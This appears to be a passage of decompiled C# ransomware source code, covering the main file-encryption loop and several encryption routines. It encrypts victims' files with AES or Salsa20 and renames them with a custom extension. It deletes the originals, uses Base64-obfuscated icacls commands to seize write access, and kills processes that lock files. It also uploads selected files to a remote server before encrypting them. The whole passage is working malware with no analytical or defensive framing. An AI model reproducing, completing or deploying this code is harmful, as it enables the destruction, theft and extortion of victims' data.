									ProcessCommand(Base64Decode("aWNhY2xzLmV4ZQ=="), "\"" + file + "\"" + Base64Decode("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + Base64Decode("OkYgL1QgL0MgL1E="));
								}
							}
							catch (Exception ex14)
							{
								if (debugmode)
								{
									try
									{
										File.AppendAllText(DebugReport, "File: " + file + " - Error while checking for user write access permission: " + ex14.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(file).Length != 0L)
									{
										goto end_IL_0520;
									}
									goto end_IL_051f;
									end_IL_0520:;
								}
								catch (Exception ex14)
								{
									if (debugmode)
									{
										try
										{
											File.AppendAllText(DebugReport, "File: " + file + " - Error while reading if filesize is zero: " + ex14.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									ErrorFiles++;
									goto end_IL_051f;
								}
								byte[] bytes2;
								if (!(PartialEncrytion == "YES") || new FileInfo(file).Length <= Convert.ToInt32(PartialSize) * 1024 * 1024 || domeall.Contains(t1))
								{
									if (UniqueHWID)
									{
										extension = LocalHWID + extension;
									}
									bytes2 = Encoding.ASCII.GetBytes(UniqueId);
									if (extension != ".*")
									{
										if (!chachapetit)
										{
											if (!Unique)
											{
												Encrypt2(file, file + extension, PasswordBytes);
											}
											else
											{
												Encrypt2(file, file + extension, Convert.FromBase64String(DynamicPass));
											}
										}
										else
										{
											try
											{
												if (!Unique)
												{
													Encrypt3(file, file + extension, PasswordBytes, Convert.FromBase64String(once));
												}
												else
												{
													Encrypt3(file, file + extension, Convert.FromBase64String(DynamicPass), Convert.FromBase64String(once));
												}
											}
											catch (Exception ex14)
											{
												if (debugmode)
												{
													try
													{
														File.AppendAllText(DebugReport, "File: " + file + " - Error while fully writing to file: " + ex14.Message + "\r\n");
													}
													catch (Exception)
													{
													}
												}
												ErrorFiles++;
												try
												{
													File.Move(file + extension, file);
												}
												catch (Exception)
												{
												}
												goto end_IL_051f;
											}
										}
									}
									else if (!chachapetit)
									{
										if (!Unique)
										{
											Encrypt2(file, file + ".part", PasswordBytes);
										}
										else
										{
											Encrypt2(file, file + ".part", Convert.FromBase64String(DynamicPass));
										}
									}
									else
									{
										try
										{
											if (!Unique)
											{
												Encrypt3(file, file, PasswordBytes, Convert.FromBase64String(once));
											}
											else
											{
												Encrypt3(file, file, Convert.FromBase64String(DynamicPass), Convert.FromBase64String(once));
											}
										}
										catch (Exception ex14)
										{
											if (debugmode)
											{
												try
												{
													File.AppendAllText(DebugReport, "File: " + file + " - Error while fully writing to file: " + ex14.Message + "\r\n");
												}
												catch (Exception)
												{
												}
											}
											ErrorFiles++;
											goto end_IL_051f;
										}
									}
									if (Unique)
									{
										if (extension != ".*")
										{
											WriteSignatureFullEncode(file + extension, bytes2);
										}
										else
										{
											WriteSignatureFullEncode(file, bytes2);
										}
									}
									goto IL_0b7d;
								}
								try
								{
									if (extension != ".*")
									{
										if (UniqueHWID)
										{
											extension = LocalHWID + extension;
										}
										File.Move(file, file + extension);
									}
								}
								catch (Exception ex14)
								{
									if (debugmode)
									{
										try
										{
											File.AppendAllText(DebugReport, "File: " + file + " - Error while renaming to crypted extension: " + ex14.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									ErrorFiles++;
									goto end_IL_051f;
								}
								partfileInfo = "";
								if (extension != ".*")
								{
									partfileInfo = file + extension;
								}
								else
								{
									partfileInfo = file;
								}
								if (Styler == "YES")
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item in extstyl)
										{
											if (partfileInfo.ToLower().EndsWith(item + extension) && LimitMe == "YES")
											{
												if (Convert.ToInt32(MaxSize) * 1024 * 1024 > new FileInfo(partfileInfo).Length)
												{
													try
													{
														UtilMe.SendB("URL", "USERNAME", "ACCESO", partfileInfo);
													}
													catch
													{
													}
												}
											}
											else if (partfileInfo.ToLower().EndsWith(item) && LimitMe == "NO")
											{
												try
												{
													UtilMe.SendB("URL", "USERNAME", "ACCESO", partfileInfo);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								bytes2 = Encoding.ASCII.GetBytes(UniqueId);
								if (Blocks == "NO")
								{
									byte[] array4 = null;
									byte[] clear2 = Encryptions.ReadFromFile(partfileInfo, Convert.ToInt32(PartialSize) * 1024 * 1024);
									if (Encryptions.WriteToFile(encrypted: (!chacha) ? (Unique ? Encryptions.AESEncryptBytes(clear2, Convert.FromBase64String(DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : Encryptions.AESEncryptBytes(clear2, Convert.FromBase64String(DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (Unique ? Salsa20.EncryptSS20(clear2, Convert.FromBase64String(DynamicPass), Convert.FromBase64String(once)) : Salsa20.EncryptSS20(clear2, Convert.FromBase64String(DynamicPass), Convert.FromBase64String(once))), filename: partfileInfo, cryptPass: bytes2))
									{
										goto IL_0b7d;
									}
									try
									{
										File.Move(file + extension, file);
									}
									catch (Exception)
									{
									}
								}
								else if (!Unique)
								{
									if (Complex.Blocks.BlockProcess(partfileInfo, PartialSize, DynamicPass, null, Convert.FromBase64String(once)))
									{
										goto IL_0b7d;
									}
									try
									{
										File.Move(file + extension, file);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (Complex.Blocks.BlockProcess(partfileInfo, PartialSize, DynamicPass, bytes2, Convert.FromBase64String(once)))
									{
										goto IL_0b7d;
									}
									try
									{
										File.Move(file + extension, file);
									}
									catch (Exception)
									{
									}
								}
								end_IL_051f:;
							}
							catch (Exception)
							{
								goto IL_0b7d;
							}
						}
					}
					continue;
					IL_0b7d:
					files.Remove(file);
				}
			});
			return;
		}
		Parallel.ForEach(files, delegate(string fileInfo)
		{
			if (((!fileInfo.Contains("C:\\Program Files\\") && !fileInfo.Contains("C:\\Program Files (x86)\\") && !fileInfo.Contains(":\\Windows\\") && !fileInfo.ToLower().Contains("perflogs") && !fileInfo.ToLower().Contains("internet explorer") && !fileInfo.Contains(":\\ProgramData\\") && !fileInfo.Contains("\\AppData\\") && !fileInfo.ToLower().Contains("msocache") && !fileInfo.ToLower().Contains("system volume information") && !fileInfo.ToLower().Contains("boot") && !fileInfo.ToLower().Contains("tor browser") && !fileInfo.ToLower().Contains("mozilla") && !fileInfo.ToLower().Contains("google chrome") && !fileInfo.ToLower().Contains("application data")) || fileInfo.Contains(Base64Decode("TWljcm9zb2Z0IFNRTCBTZXJ2ZXI="))) && !fileInfo.Contains("autoexec.bat") && !fileInfo.Contains("desktop.ini") && !fileInfo.Contains("autorun.inf") && !fileInfo.Contains("ntuser.dat") && !fileInfo.Contains("NTUSER.DAT") && !fileInfo.Contains("iconcache.db") && !fileInfo.Contains("bootsect.bak") && !fileInfo.Contains("boot.ini") && !fileInfo.Contains("ntuser.dat.log") && !fileInfo.Contains("thumbs.db") && !fileInfo.ToLower().Contains("bootmgr") && !fileInfo.ToLower().Contains("pagefile.sys") && !fileInfo.ToLower().Contains("config.sys") && !fileInfo.ToLower().Contains("ntuser.ini") && !fileInfo.Contains(Base64Decode("QnVpbGRlcl9Mb2c=")) && !fileInfo.Contains("RSAKeys") && !fileInfo.Contains("Config.enc") && !fileInfo.Contains("Инструкция") && !fileInfo.EndsWith(extension) && !fileInfo.EndsWith("exe") && !fileInfo.EndsWith("dll") && !fileInfo.EndsWith("EXE") && !fileInfo.EndsWith("DLL") && !fileInfo.Contains("Recycle.Bin") && !fileInfo.Contains(MyStartName) && !fileInfo.Contains(DebugReport) && !fileInfo.Contains(LocalReportFileName))
			{
				if (excluded.Length != 0)
				{
					string[] array = excluded;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!fileInfo.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0d70;
					}
				}
				try
				{
					if (fileInfo.EndsWith(extension))
					{
						goto IL_0d70;
					}
				}
				catch (Exception)
				{
					goto IL_0d70;
				}
				if (!EncryptedFiles.Contains(fileInfo))
				{
					if (ReleaseLockedFiles == "YES")
					{
						try
						{
							if (LockedFiles.Islocked(fileInfo))
							{
								LockedFiles.Killproc(fileInfo);
							}
						}
						catch
						{
						}
					}
					EncryptedFiles.Add(fileInfo);
					if (!EncryptedDirs.Contains(Path.GetDirectoryName(fileInfo)))
					{
						EncryptedDirs.Add(Path.GetDirectoryName(fileInfo));
					}
					RemoveReadOnlyAttribute(fileInfo);
					try
					{
						new FileUnblocker().Unblock(fileInfo);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(fileInfo, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (ConsoleReport)
								{
									Console.WriteLine("Setting write access permission: " + fileInfo + " - File Size: " + new FileInfo(fileInfo).Length + " bytes");
									Console.WriteLine("----------------------------------------------------------------------------");
								}
							}
							catch
							{
							}
							ProcessCommand(Base64Decode("aWNhY2xzLmV4ZQ=="), "\"" + fileInfo + "\"" + Base64Decode("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + Base64Decode("OkYgL1QgL0MgL1E="));
						}
					}
					catch (Exception ex2)
					{
						if (debugmode)
						{
							try
							{
								File.AppendAllText(DebugReport, "File: " + fileInfo + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(fileInfo).Length != 0L)
							{
								goto end_IL_0675;
							}
							goto end_IL_0674;
							end_IL_0675:;
						}
						catch (Exception ex2)
						{
							if (debugmode)
							{
								try
								{
									File.AppendAllText(DebugReport, "File: " + fileInfo + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							ErrorFiles++;
							goto end_IL_0674;
						}
						if (PartialEncrytion == "YES" && new FileInfo(fileInfo).Length > Convert.ToInt32(PartialSize) * 1024 * 1024)
						{
							try
							{
								if (extension != ".*")
								{
									if (UniqueHWID)
									{
										extension = LocalHWID + extension;
									}
									File.Move(fileInfo, fileInfo + extension);
								}
							}
							catch (Exception ex2)
							{
								if (debugmode)
								{
									try
									{
										File.AppendAllText(DebugReport, "File: " + fileInfo + " - Error while renaming to crypted extension: " + ex2.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								ErrorFiles++;
								return;
							}
							if (extension != ".*")
							{
								fileInfo += extension;
							}
							if (Styler == "YES")
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in extstyl)
									{
										if (fileInfo.ToLower().EndsWith(item2 + extension) && LimitMe == "YES")
										{
											if (Convert.ToInt32(MaxSize) * 1024 * 1024 > new FileInfo(fileInfo).Length)
											{
												try
												{
													UtilMe.SendB("URL", "USERNAME", "ACCESO", fileInfo);
												}
												catch
												{
												}
											}
										}
										else if (fileInfo.ToLower().EndsWith(item2) && LimitMe == "NO")
										{
											try
											{
												UtilMe.SendB("URL", "USERNAME", "ACCESO", fileInfo);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							byte[] bytes = Encoding.ASCII.GetBytes(UniqueId);
							if (Blocks == "NO")
							{
								byte[] array2 = null;
								byte[] clear = Encryptions.ReadFromFile(fileInfo, Convert.ToInt32(PartialSize) * 1024 * 1024);
								if (!Encryptions.WriteToFile(encrypted: (!chacha) ? (Unique ? Encryptions.AESEncryptBytes(clear, Convert.FromBase64String(DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : Encryptions.AESEncryptBytes(clear, Convert.FromBase64String(DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (Unique ? Salsa20.EncryptSS20(clear, Convert.FromBase64String(DynamicPass), Convert.FromBase64String(once)) : Salsa20.EncryptSS20(clear, Convert.FromBase64String(DynamicPass), Convert.FromBase64String(once))), filename: fileInfo, cryptPass: bytes))
								{
									try
									{
										File.Move(fileInfo + extension, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!Unique)
							{
								if (!Complex.Blocks.BlockProcess(fileInfo, PartialSize, DynamicPass, null, Convert.FromBase64String(once)))
								{
									try
									{
										File.Move(fileInfo + extension, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!Complex.Blocks.BlockProcess(fileInfo, PartialSize, DynamicPass, bytes, Convert.FromBase64String(once)))
							{
								try
								{
									File.Move(fileInfo + extension, fileInfo);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (UniqueHWID)
							{
								extension = LocalHWID + extension;
							}
							byte[] bytes = Encoding.ASCII.GetBytes(UniqueId);
							if (extension != ".*")
							{
								if (!chachapetit)
								{
									if (!Unique)
									{
										Encrypt2(fileInfo, fileInfo + extension, PasswordBytes);
									}
									else
									{
										Encrypt2(fileInfo, fileInfo + extension, Convert.FromBase64String(DynamicPass));
									}
								}
								else
								{
									try
									{
										if (!Unique)
										{
											Encrypt3(fileInfo, fileInfo + extension, PasswordBytes, Convert.FromBase64String(once));
										}
										else
										{
											Encrypt3(fileInfo, fileInfo + extension, Convert.FromBase64String(DynamicPass), Convert.FromBase64String(once));
										}
									}
									catch (Exception ex2)
									{
										if (debugmode)
										{
											try
											{
												File.AppendAllText(DebugReport, "File: " + fileInfo + " - Error while fully writing to file: " + ex2.Message + "\r\n");
											}
											catch (Exception)
											{
											}
										}
										ErrorFiles++;
										try
										{
											File.Move(fileInfo + extension, fileInfo);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!chachapetit)
							{
								if (!Unique)
								{
									Encrypt2(fileInfo, fileInfo + ".part", PasswordBytes);
								}
								else
								{
									Encrypt2(fileInfo, fileInfo + ".part", Convert.FromBase64String(DynamicPass));
								}
							}
							else
							{
								try
								{
									if (!Unique)
									{
										Encrypt3(fileInfo, fileInfo, PasswordBytes, Convert.FromBase64String(once));
									}
									else
									{
										Encrypt3(fileInfo, fileInfo, Convert.FromBase64String(DynamicPass), Convert.FromBase64String(once));
									}
								}
								catch (Exception ex2)
								{
									if (debugmode)
									{
										try
										{
											File.AppendAllText(DebugReport, "File: " + fileInfo + " - Error while fully writing to file: " + ex2.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									ErrorFiles++;
									return;
								}
							}
							if (Unique)
							{
								if (extension != ".*")
								{
									WriteSignatureFullEncode(fileInfo + extension, bytes);
								}
								else
								{
									WriteSignatureFullEncode(fileInfo, bytes);
								}
							}
						}
						end_IL_0674:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0d70;
			IL_0d70:
			files.Remove(fileInfo);
		});
	}

	private static void Encrypt(string inputFile, string outputFile, byte[] passwordBytes)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(outputFile, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (outputFile.Length > 0)
				{
					FileStream fileStream3 = new FileStream(inputFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (Styler == "YES")
					{
						foreach (string item in extstyl)
						{
							if (inputFile.ToLower().EndsWith(item) && LimitMe == "YES")
							{
								if (Convert.ToInt32(MaxSize) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										UtilMe.SendB("URL", "USERNAME", "ACCESO", inputFile);
									}
									catch
									{
									}
								}
							}
							else if (inputFile.ToLower().EndsWith(item) && LimitMe == "NO")
							{
								try
								{
									UtilMe.SendB("URL", "USERNAME", "ACCESO", inputFile);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(inputFile) && num2 >= 0)
							{
								File.Delete(inputFile);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (outputFile.EndsWith(".part"))
					{
						File.Move(outputFile, outputFile.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(outputFile);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void Encrypt3(string inputFile, string outputFile, byte[] passwordBytes, byte[] salt = null)
	{
		try
		{
			if (Styler == "YES")
			{
				FileStream fileStream = new FileStream(inputFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in extstyl)
				{
					if (inputFile.ToLower().EndsWith(item) && LimitMe == "YES")
					{
						if (Convert.ToInt32(MaxSize) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								UtilMe.SendB("URL", "USERNAME", "ACCESO", inputFile);
							}
							catch
							{
							}
						}
					}
					else if (inputFile.ToLower().EndsWith(item) && LimitMe == "NO")
					{
						try
						{
							UtilMe.SendB("URL", "USERNAME", "ACCESO", inputFile);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (inputFile != outputFile)
		{
			File.Move(inputFile, outputFile);
			inputFile = outputFile;
		}
		byte[] bytes = Salsa20.EncryptSS20(File.ReadAllBytes(inputFile), passwordBytes, salt);
		File.WriteAllBytes(inputFile, bytes);
		ProcessedFiles++;
	}

	private static void Encrypt2(string inputFile, string outputFile, byte[] passwordBytes)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string path = outputFile;
			FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (Mmf == "YES")
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(inputFile, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
				int num2;
				while ((num2 = fileStream2.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num2);
				}
				fileStream2.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (outputFile.Length > 0)
				{
					if (Styler == "YES")
					{
						FileStream fileStream3 = new FileStream(inputFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in extstyl)
						{
							if (inputFile.ToLower().EndsWith(item) && LimitMe == "YES")
							{
								if (Convert.ToInt32(MaxSize) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										UtilMe.SendB("URL", "USERNAME", "ACCESO", inputFile);
									}
									catch
									{
									}
								}
							}
							else if (inputFile.ToLower().EndsWith(item) && LimitMe == "NO")
							{
								try
								{
									UtilMe.SendB("URL", "USERNAME", "ACCESO", inputFile);
								}
								catch
								{
								}
							}
						}
						fileStream3.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(inputFile);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (outputFile.EndsWith(".part"))
					{
						File.Move(outputFile, outputFile.Replace(".part", ""));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(outputFile))
							{
								File.Delete(outputFile);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (debugmode)
			{
				try
				{
					File.AppendAllText(DebugReport, "File: " + inputFile + " - Error while fully writing to file: " + ex2.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
